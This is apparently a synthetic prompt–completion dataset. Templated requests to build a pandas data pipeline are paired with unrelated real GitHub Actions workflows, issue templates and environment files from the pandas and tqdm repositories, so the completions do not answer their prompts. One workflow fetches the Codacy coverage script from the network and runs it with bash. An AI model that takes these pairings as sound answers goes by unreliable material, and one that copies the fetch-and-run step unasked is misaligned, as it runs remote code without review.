{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Submit Question\ndescription: Ask a general question about pandas\ntitle: \"QST: \"\nlabels: [Usage Question, Needs Triage]\n\nbody:\n  - type: markdown\n    attributes:\n      value: >\n        Since [StackOverflow](https://stackoverflow.com) is better suited towards answering\n        usage questions, we ask that all usage questions are first asked on StackOverflow.\n  - type: checkboxes\n    attributes:\n      label: Research\n      options:\n        - label: >\n            I have searched the [[pandas] tag](https://stackoverflow.com/questions/tagged/pandas)\n            on StackOverflow for similar questions.\n          required: true\n        - label: >\n            I have asked my usage related question on [StackOverflow](https://stackoverflow.com).\n          required: true\n  - type: input\n    id: question-link\n    attributes:\n      label: Link to question on StackOverflow\n    validations:\n      required: true\n  - type: markdown\n    attributes:\n      value: ---\n  - type: textarea\n    id: question\n    attributes:\n      label: Question about pandas\n      description: >\n        **Note**: If you'd still like to submit a question, please read [this guide](\n        https://matthewrocklin.com/blog/work/2018/02/28/minimal-bug-reports) detailing\n        how to provide the necessary information for us to reproduce your question.\n      placeholder: |\n        ```python\n        # Your code here, if applicable\n\n        ```\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/submit_question.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Build pandas\ndescription: Rebuilds the C extensions and installs pandas\ninputs:\n  editable:\n    description: Whether to build pandas in editable mode (default true)\n    default: true\n  werror:\n    description: Enable werror flag for build\n    default: true\nruns:\n  using: composite\n  steps:\n\n    - name: Environment Detail\n      run: |\n        micromamba info\n        micromamba list\n        pip list --pre\n      shell: bash -el {0}\n\n    - name: Uninstall existing Pandas installation\n      run: |\n        if pip show pandas 1>/dev/null; then\n          pip uninstall -y pandas\n        fi\n      shell: bash -el {0}\n\n    - name: Build Pandas\n      run: |\n        if [[ ${{ inputs.editable }} == \"true\" ]]; then\n          pip install -e . --no-build-isolation -v --no-deps \\\n            ${{ inputs.werror == 'true' && '-Csetup-args=\"--werror\"' || '' }}\n        else\n          pip install . --no-build-isolation -v --no-deps \\\n            ${{ inputs.werror == 'true' && '-Csetup-args=\"--werror\"' || '' }}\n        fi\n      shell: bash -el {0}\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/actions/build_pandas/action.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Run tests and report results\nruns:\n  using: composite\n  steps:\n    - name: Test\n      run: ci/run_tests.sh\n      shell: bash -el {0}\n\n    - name: Publish test results\n      uses: actions/upload-artifact@v4\n      with:\n        name: Test results\n        path: test-data.xml\n      if: failure()\n\n    - name: Upload coverage to Codecov\n      uses: codecov/codecov-action@v5\n      with:\n        flags: unittests\n        name: codecov-pandas\n        fail_ci_if_error: false\n      if: failure()\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/actions/run-tests/action.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Set up Conda environment\ninputs:\n  environment-file:\n    description: Conda environment file to use.\n    default: environment.yml\nruns:\n  using: composite\n  steps:\n    - name: Install ${{ inputs.environment-file }}\n      uses: mamba-org/setup-micromamba@v2\n      with:\n        environment-file: ${{ inputs.environment-file }}\n        environment-name: test\n        condarc-file: ci/.condarc\n        cache-environment: true\n        cache-downloads: true\n\n    - name: Uninstall pyarrow\n      if: ${{ env.REMOVE_PYARROW == '1' }}\n      run: |\n        micromamba remove -y pyarrow\n      shell: bash -el {0}\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/actions/setup-conda/action.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Linkcheck\non:\n  schedule:\n  # Run monthly on the 1st day of the month\n    - cron: '0 0 1 * *'\n  pull_request:\n    paths:\n      - \".github/workflows/broken-linkcheck.yml\"\n      - \"doc/make.py\"\njobs:\n  linkcheck:\n    if: false\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash -el {0}\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Set up Conda\n        uses: ./.github/actions/setup-conda\n\n      - name: Build Pandas\n        uses: ./.github/actions/build_pandas\n\n      - name: Run linkcheck script\n        working-directory: ./doc\n        run: |\n          set -o pipefail\n          python make.py linkcheck | tee linkcheck.txt\n\n      - name: Display broken links\n        if: failure()\n        working-directory: ./doc\n        run: grep broken linkcheck.txt\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/workflows/broken-linkcheck.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Purge caches daily\non:\n  schedule:\n    # 4:10 UTC daily\n    - cron: \"10 4 * * *\"\n\njobs:\n  cleanup:\n    runs-on: ubuntu-latest\n    if: github.repository_owner == 'pandas-dev'\n    permissions:\n      actions: write\n    steps:\n      - name: Clean Cache\n        run: |\n          gh extension install actions/gh-actions-cache\n\n          REPO=${{ github.repository }}\n\n          echo \"Fetching list of cache key\"\n          allCaches=$(gh actions-cache list -L 100 -R $REPO | cut -f 1 )\n\n          ## Setting this to not fail the workflow while deleting cache keys.\n          set +e\n          echo \"Deleting caches...\"\n          for cacheKey in $allCaches\n          do\n              gh actions-cache delete $cacheKey -R $REPO --confirm\n          done\n          echo \"Done\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/workflows/cache-cleanup-daily.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Code Checks\n\non:\n  push:\n    branches:\n      - main\n      - 2.3.x\n  pull_request:\n    branches:\n      - main\n      - 2.3.x\n\nenv:\n  ENV_FILE: environment.yml\n  PANDAS_CI: 1\n\npermissions:\n  contents: read\n\n# pre-commit run by https://pre-commit.ci/\njobs:\n  docstring_typing_manual_hooks:\n    name: Docstring validation, typing, and other manual pre-commit hooks\n    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -el {0}\n\n    concurrency:\n      # https://github.community/t/concurrecy-not-work-for-push/183068/7\n      group: ${{ github.event_name == 'push' && github.run_number || github.ref }}-code-checks\n      cancel-in-progress: true\n\n    steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n      with:\n        fetch-depth: 0\n\n    - name: Set up Conda\n      uses: ./.github/actions/setup-conda\n\n    - name: Build Pandas\n      id: build\n      uses: ./.github/actions/build_pandas\n      with:\n        editable: false\n\n    # The following checks are independent of each other and should still be run if one fails\n\n    # TODO: The doctests have to be run first right now, since the Cython doctests only work\n    # with pandas installed in non-editable mode\n    # This can be removed once pytest-cython doesn't require C extensions to be installed inplace\n\n    - name: Extra installs\n      # https://pytest-qt.readthedocs.io/en/latest/troubleshooting.html#github-actions-azure-pipelines-travis-ci-and-gitlab-ci-cd\n      run: sudo apt-get update && sudo apt-get install -y libegl1 libopengl0\n\n    - name: Run doctests\n      run: cd ci && ./code_checks.sh doctests\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Install pandas in editable mode\n      id: build-editable\n      if: ${{ steps.build.outcome == 'success' && always() }}\n      uses: ./.github/actions/build_pandas\n      with:\n        editable: true\n\n    - name: Check for no warnings when building single-page docs\n      run: ci/code_checks.sh single-docs\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Run checks on imported code\n      run: ci/code_checks.sh code\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Run docstring validation\n      run: ci/code_checks.sh docstrings\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Run check of documentation notebooks\n      run: ci/code_checks.sh notebooks\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Use existing environment for type checking\n      run: |\n        echo $PATH >> $GITHUB_PATH\n        echo \"PYTHONHOME=$PYTHONHOME\" >> $GITHUB_ENV\n        echo \"PYTHONPATH=$PYTHONPATH\" >> $GITHUB_ENV\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Typing\n      uses: pre-commit/action@v3.0.1\n      with:\n        extra_args: --verbose --hook-stage manual --all-files\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n    - name: Run docstring validation script tests\n      run: pytest scripts\n      if: ${{ steps.build.outcome == 'success' && always() }}\n\n  asv-benchmarks:\n    name: ASV Benchmarks\n    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -el {0}\n\n    concurrency:\n      # https://github.community/t/concurrecy-not-work-for-push/183068/7\n      group: ${{ github.event_name == 'push' && github.run_number || github.ref }}-asv-benchmarks\n      cancel-in-progress: true\n\n    steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n      with:\n        fetch-depth: 0\n\n    - name: Set up Conda\n      uses: ./.github/actions/setup-conda\n\n    - name: Build Pandas\n      id: build\n      uses: ./.github/actions/build_pandas\n\n    - name: Run ASV benchmarks\n      run: |\n        cd asv_bench\n        asv machine --yes\n        asv run --quick --dry-run --durations=30 --python=same --show-stderr\n\n  build_docker_dev_environment:\n    name: Build Docker Dev Environment\n    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -el {0}\n\n    concurrency:\n      # https://github.community/t/concurrecy-not-work-for-push/183068/7\n      group: ${{ github.event_name == 'push' && github.run_number || github.ref }}-build_docker_dev_environment\n      cancel-in-progress: true\n\n    steps:\n      - name: Clean up dangling images\n        run: docker image prune -f\n\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Build image\n        run: docker build --pull --no-cache --tag pandas-dev-env .\n\n      - name: Show environment\n        run: docker run --rm pandas-dev-env python -c \"import pandas as pd; print(pd.show_versions())\"\n\n  requirements-dev-text-installable:\n    name: Test install requirements-dev.txt\n    runs-on: ubuntu-24.04\n\n    concurrency:\n      # https://github.community/t/concurrecy-not-work-for-push/183068/7\n      group: ${{ github.event_name == 'push' && github.run_number || github.ref }}-requirements-dev-text-installable\n      cancel-in-progress: true\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Setup Python\n        id: setup_python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.10'\n          cache: 'pip'\n          cache-dependency-path: 'requirements-dev.txt'\n\n      - name: Install requirements-dev.txt\n        run: pip install -r requirements-dev.txt\n\n      - name: Check Pip Cache Hit\n        run: echo ${{ steps.setup_python.outputs.cache-hit }}\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/workflows/code-checks.yml", "language": "yaml", "complexity": "medium", "star_count": 46101, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CodeQL\non:\n  schedule:\n    # every day at midnight\n    - cron: \"0 0 * * *\"\n\nconcurrency:\n  group: ${{ github.repository }}-${{ github.head_ref || github.sha }}-${{ github.workflow }}\n  cancel-in-progress: true\n\npermissions:\n  contents: read\n\njobs:\n  analyze:\n    runs-on: ubuntu-24.04\n    permissions:\n      actions: read\n      contents: read\n      security-events: write\n    if: github.repository_owner == 'pandas-dev'\n\n    strategy:\n      fail-fast: false\n      matrix:\n        language:\n          - python\n\n    steps:\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n      - uses: github/codeql-action/autobuild@v3\n      - uses: github/codeql-action/analyze@v3\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/workflows/codeql.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Comment Commands\non:\n  issue_comment:\n    types: created\n\npermissions:\n  contents: read\n  issues: write\n  pull-requests: write\n\njobs:\n  issue_assign:\n    runs-on: ubuntu-24.04\n    if: (!github.event.issue.pull_request) && github.event.comment.body == 'take'\n    concurrency:\n      group: ${{ github.actor }}-issue-assign\n    steps:\n      - run: |\n          echo \"Assigning issue ${{ github.event.issue.number }} to ${{ github.event.comment.user.login }}\"\n          curl -H \"Authorization: token ${{ secrets.GITHUB_TOKEN }}\" -d '{\"assignees\": [\"${{ github.event.comment.user.login }}\"]}' https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.issue.number }}/assignees\n  preview_docs:\n    runs-on: ubuntu-24.04\n    if: github.event.issue.pull_request && github.event.comment.body == '/preview'\n    concurrency:\n      group: ${{ github.actor }}-preview-docs\n    steps:\n      - uses: pandas-dev/github-doc-previewer@v0.3.2\n        with:\n          previewer-server: \"https://pandas.pydata.org/preview\"\n          artifact-job: \"Doc Build and Upload\"\n  asv_run:\n    runs-on: ubuntu-24.04\n    # TODO: Support more benchmarking options later, against different branches, against self, etc\n    if: github.event.issue.pull_request && startsWith(github.event.comment.body, '@github-actions benchmark')\n    defaults:\n      run:\n        shell: bash -el {0}\n    env:\n      ENV_FILE: environment.yml\n      COMMENT: ${{github.event.comment.body}}\n\n    concurrency:\n      # Set concurrency to prevent abuse(full runs are ~5.5 hours !!!)\n      # each user can only run one concurrent benchmark bot at a time\n      # We don't cancel in progress jobs, but if you want to benchmark multiple PRs, you're gonna have\n      # to wait\n      group: ${{ github.actor }}-asv\n      cancel-in-progress: false\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n        # Although asv sets up its own env, deps are still needed\n        # during discovery process\n      - name: Set up Conda\n        uses: ./.github/actions/setup-conda\n\n      - name: Run benchmarks\n        id: bench\n        continue-on-error: true # asv will exit code 1 for regressions\n        run: |\n          # extracting the regex, see https://stackoverflow.com/a/36798723\n          REGEX=$(echo \"$COMMENT\" | sed -n \"s/^.*-b\\s*\\(\\S*\\).*$/\\1/p\")\n          cd asv_bench\n          asv check -E existing\n          git remote add upstream https://github.com/pandas-dev/pandas.git\n          git fetch upstream\n          asv machine --yes\n          asv continuous -f 1.1 -b $REGEX upstream/main HEAD\n          echo 'BENCH_OUTPUT<<EOF' >> $GITHUB_ENV\n          asv compare -f 1.1 upstream/main HEAD >> $GITHUB_ENV\n          echo 'EOF' >> $GITHUB_ENV\n          echo \"REGEX=$REGEX\" >> $GITHUB_ENV\n\n      - uses: actions/github-script@v7\n        env:\n          BENCH_OUTPUT: ${{env.BENCH_OUTPUT}}\n          REGEX: ${{env.REGEX}}\n        with:\n          script: |\n            const ENV_VARS = process.env\n            const run_url = `https://github.com/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`\n            github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: '\\nBenchmarks completed. View runner logs here.' + run_url + '\\nRegex used: '+ 'regex ' + ENV_VARS[\"REGEX\"] + '\\n' + ENV_VARS[\"BENCH_OUTPUT\"]\n            })\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/workflows/comment-commands.yml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Test\non:\n  push:\n  pull_request:\n  schedule: [{cron: '2 1 * * 6'}]  # M H d m w (Sat 1:02)\njobs:\n  check:\n    if: github.event_name != 'pull_request' || !contains('OWNER,MEMBER,COLLABORATOR', github.event.pull_request.author_association)\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n    - uses: actions/setup-python@v5\n      with:\n        python-version: '3.x'\n    - name: set PYSHA\n      run: echo \"PYSHA=$(python -VV | sha256sum | cut -d' ' -f1)\" >> $GITHUB_ENV\n    - uses: actions/cache@v4\n      with:\n        path: ~/.cache/pre-commit\n        key: pre-commit|${{ env.PYSHA }}|${{ hashFiles('.pre-commit-config.yaml') }}\n    - name: dependencies\n      run: pip install -U pre-commit\n    - uses: reviewdog/action-setup@v1\n    - if: github.event_name == 'push' || github.event_name == 'pull_request'\n      name: comment\n      run: |\n        if test \"$EVENT\" = pull_request; then\n          REPORTER=github-pr-review\n        else\n          REPORTER=github-check\n        fi\n        pre-commit run -a todo | reviewdog -efm=\"%f:%l: %m\" -name=TODO -tee -reporter=$REPORTER -filter-mode nofilter\n        pre-commit run -a flake8 | reviewdog -f=pep8 -name=flake8 -tee -reporter=$REPORTER -filter-mode nofilter\n      env:\n        REVIEWDOG_GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        EVENT: ${{ github.event_name }}\n    - run: pre-commit run -a --show-diff-on-failure\n  test:\n    if: github.event_name != 'pull_request' || !contains('OWNER,MEMBER,COLLABORATOR', github.event.pull_request.author_association)\n    name: py${{ matrix.python }}-${{ matrix.os }}\n    continue-on-error: ${{ matrix.os == 'windows' }}\n    strategy:\n      matrix:\n        os: [ubuntu]\n        python: [3.7, 3.8, 3.9, '3.10', 3.11, 3.12]\n        include:\n        - {os: macos, python: 3.12}\n        - {os: windows, python: 3.12}\n    runs-on: ${{ matrix.os }}-latest\n    timeout-minutes: 35\n    defaults: {run: {shell: bash}}\n    steps:\n    - uses: actions/checkout@v4\n      with: {fetch-depth: 0}\n    - uses: actions/setup-python@v5\n      with:\n        python-version: ${{ matrix.python }}\n    - name: install\n      run: |\n        pip install -U tox tox-gh-actions\n        mkdir -p \"$HOME/bin\"\n        curl -sfL https://coverage.codacy.com/get.sh > \"$HOME/bin/codacy\"\n        chmod +x \"$HOME/bin/codacy\"\n        echo \"$HOME/bin\" >> $GITHUB_PATH\n    - name: tox\n      run: |\n        if test \"py${{ matrix.python }}\" = py3.7; then\n          sed -i /asyncio_default_fixture_loop_scope/d pyproject.toml\n        fi\n        if test \"py${{ matrix.python }}-${{ matrix.os }}\" = py3.11-ubuntu; then\n          export TOXENV=\"py311-tf,py311-tf-keras\"  # full\n        fi\n        if test \"${{ matrix.os }}\" != ubuntu; then\n          tox -e py${PYVER/./}                     # basic\n        else\n          timeout 5m tox || timeout 5m tox || timeout 5m tox\n        fi\n      env:\n        PYVER: ${{ matrix.python }}\n        PLATFORM: ${{ matrix.os }}\n        COVERALLS_FLAG_NAME: py${{ matrix.python }}-${{ matrix.os }}\n        COVERALLS_PARALLEL: true\n        COVERALLS_SERVICE_NAME: github\n        # coveralls needs explicit token\n        COVERALLS_REPO_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        CODACY_PROJECT_TOKEN: ${{ secrets.CODACY_PROJECT_TOKEN }}\n        CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}\n  finish:\n    name: pytest cov\n    continue-on-error: ${{ github.event_name != 'push' }}\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/setup-python@v5\n      with:\n        python-version: '3.x'\n    - name: Coveralls Finished\n      run: |\n        pip install -U coveralls\n        coveralls --finish || :\n      env:\n        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n    - name: Codacy Finished\n      run: |\n        curl -sfL https://coverage.codacy.com/get.sh > codacy\n        bash codacy final || :\n      env:\n        CODACY_PROJECT_TOKEN: ${{ secrets.CODACY_PROJECT_TOKEN }}\n  deploy:\n    needs: [check, test]\n    runs-on: ubuntu-latest\n    environment: pypi\n    permissions: {contents: write, id-token: write, packages: write}\n    steps:\n    - uses: actions/checkout@v4\n      with:\n        fetch-depth: 0\n        token: ${{ secrets.GH_TOKEN || github.token }}\n    - uses: actions/setup-python@v5\n      with:\n        python-version: '3.x'\n    - name: Install\n      run: |\n        sudo apt-get install -yqq pandoc\n        pip install -r .meta/requirements-build.txt\n        make build .dockerignore Dockerfile snapcraft.yaml\n    - id: dist\n      uses: casperdcl/deploy-pypi@v2\n      with:\n        gpg_key: ${{ secrets.GPG_KEY }}\n        upload: ${{ github.event_name == 'push' && startsWith(github.ref, 'refs/tags') }}\n    - id: collect_assets\n      name: Collect assets\n      run: |\n        if [[ $GITHUB_REF == refs/tags/v* ]]; then\n          echo docker_tags=latest,${GITHUB_REF/refs\\/tags\\/v/} >> $GITHUB_OUTPUT\n          echo snap_channel=stable,candidate,edge >> $GITHUB_OUTPUT\n        elif test \"$GITHUB_REF\" = refs/heads/master; then\n          echo docker_tags=master >> $GITHUB_OUTPUT\n          echo snap_channel=candidate,edge >> $GITHUB_OUTPUT\n        elif test \"$GITHUB_REF\" = refs/heads/devel; then\n          echo docker_tags=devel >> $GITHUB_OUTPUT\n          echo snap_channel=edge >> $GITHUB_OUTPUT\n        fi\n    - if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags')\n      name: Release\n      run: |\n        changelog=$(git log --pretty='format:%d%n- %s%n%b---' $(git tag --sort=v:refname | tail -n2 | head -n1)..HEAD)\n        tag=\"${GITHUB_REF#refs/tags/}\"\n        gh release create --title \"tqdm $tag stable\" --draft --notes \"$changelog\" \"$tag\" dist/${{ steps.dist.outputs.whl }} dist/${{ steps.dist.outputs.whl_asc }}\n      env:\n        GH_TOKEN: ${{ secrets.GH_TOKEN }}\n    - uses: snapcore/action-build@v1\n      id: snap_build\n    - if: github.event_name == 'push' && steps.collect_assets.outputs.snap_channel\n      uses: snapcore/action-publish@v1\n      with:\n        snap: ${{ steps.snap_build.outputs.snap }}\n        release: ${{ steps.collect_assets.outputs.snap_channel }}\n      env:\n        SNAPCRAFT_STORE_CREDENTIALS: ${{ secrets.SNAP_TOKEN }}\n    - name: Docker build push\n      uses: elgohr/Publish-Docker-Github-Action@master\n      with:\n        name: ${{ github.repository }}\n        tags: ${{ steps.collect_assets.outputs.docker_tags }}\n        password: ${{ secrets.DOCKER_PWD }}\n        username: ${{ secrets.DOCKER_USR }}\n        no_push: ${{ steps.collect_assets.outputs.docker_tags == '' }}\n    - name: Docker push GitHub\n      uses: elgohr/Publish-Docker-Github-Action@master\n      with:\n        name: ${{ github.repository }}/tqdm\n        tags: ${{ steps.collect_assets.outputs.docker_tags }}\n        password: ${{ github.token }}\n        username: ${{ github.actor }}\n        registry: docker.pkg.github.com\n        no_push: ${{ steps.collect_assets.outputs.docker_tags == '' }}\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": ".github/workflows/test.yml", "language": "yaml", "complexity": "medium", "star_count": 30170, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "default_language_version:\n  python: python3\nrepos:\n- repo: https://github.com/pre-commit/pre-commit-hooks\n  rev: v5.0.0\n  hooks:\n  - id: check-added-large-files\n  - id: check-case-conflict\n  - id: check-docstring-first\n  - id: check-executables-have-shebangs\n  - id: check-toml\n  - id: check-merge-conflict\n  - id: check-yaml\n  - id: debug-statements\n  - id: end-of-file-fixer\n  - id: mixed-line-ending\n  - id: sort-simple-yaml\n  - id: trailing-whitespace\n    exclude: ^README.rst$\n- repo: local\n  hooks:\n  - id: todo\n    name: Check TODO\n    language: pygrep\n    entry: WIP\n    args: [-i]\n    types: [text]\n    exclude: ^(.pre-commit-config.yaml|.github/workflows/test.yml)$\n  - id: pytest\n    name: pytest quick\n    language: python\n    entry: pytest\n    args: [-qq, --durations=1, -k=not slow]\n    types: [python]\n    pass_filenames: false\n    additional_dependencies:\n    - numpy\n    - pandas\n    - pytest-timeout\n    - pytest-asyncio>=0.24\n- repo: https://github.com/PyCQA/flake8\n  rev: 7.1.1\n  hooks:\n  - id: flake8\n    args: [-j8]\n    additional_dependencies:\n    - flake8-broken-line\n    - flake8-bugbear\n    - flake8-comprehensions\n    - flake8-debugger\n    - flake8-isort\n    - flake8-pyproject\n    - flake8-string-format\n- repo: https://github.com/PyCQA/isort\n  rev: 5.13.2\n  hooks:\n  - id: isort\n- repo: https://github.com/kynan/nbstripout\n  rev: 0.7.1\n  hooks:\n  - id: nbstripout\n    args: [--keep-count, --keep-output]\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": ".pre-commit-config.yaml", "language": "yaml", "complexity": "simple", "star_count": 30170, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# development environment\nname: tqdm\nchannels:\n- conda-forge\n- defaults\ndependencies:\n# base\n- python >=3.7\n- pip\n- ipykernel\n- ipywidgets\n- setuptools\n- setuptools_scm\n- toml\n# test env managers\n- pre-commit\n- tox\n- asv\n# tests (native)\n- pytest\n- pytest-cov\n- pytest-timeout\n- pytest-asyncio>=0.24\n- coverage\n# extras\n- dask               # dask\n- matplotlib         # gui\n- numpy              # pandas, keras, contrib.tenumerate\n- pandas\n- pyarrow            # pandas\n- tensorflow         # keras\n- slack-sdk          # contrib.slack\n- requests           # contrib.telegram\n- rich               # rich\n- argopt             # `cd wiki && pymake`\n- twine              # `pymake check pypi`\n- python-build       # `python -m build`\n# `cd docs && pymake`\n- mkdocs-material\n- pygments\n- pymdown-extensions\n- pip:\n  - git+https://github.com/casperdcl/nbval.git@master#egg=nbval # tests (native)\n  - py-make >=0.1.0                                          # `make/pymake`\n  - mkdocs-minify-plugin                                     # `cd docs && pymake`\n  - git+https://github.com/tqdm/jsmin@fix-pip#egg=jsmin      # `cd docs && pymake`\n  - pydoc-markdown >=4.6                                     # `cd docs && pymake`\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "environment.yml", "language": "yaml", "complexity": "simple", "star_count": 30170, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
